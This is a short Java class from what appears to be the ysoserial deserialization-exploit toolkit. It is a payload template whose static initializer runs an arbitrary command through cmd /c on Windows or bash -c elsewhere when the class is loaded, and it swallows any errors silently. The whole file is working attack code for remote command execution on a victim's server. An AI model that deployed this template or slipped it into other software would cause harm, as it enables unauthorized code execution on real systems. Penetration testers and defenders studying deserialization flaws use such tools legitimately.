package ysoserial.payloads.templates;

import java.io.IOException;

public class CommandTemplate {
    static String cmd;

    static {

        String[] cmds = new String[3];

        try {
            if (System.getProperty("os.name").toLowerCase().contains("win")) {
                cmds[0] = "cmd";
                cmds[1] = "/c";
            } else {
                cmds[0] = "bash";
                cmds[1] = "-c";
            }
            cmds[2] = cmd;

            Runtime.getRuntime().exec(cmds);
        } catch (IOException e) {
            // e.printStackTrace();
        }
    }
}
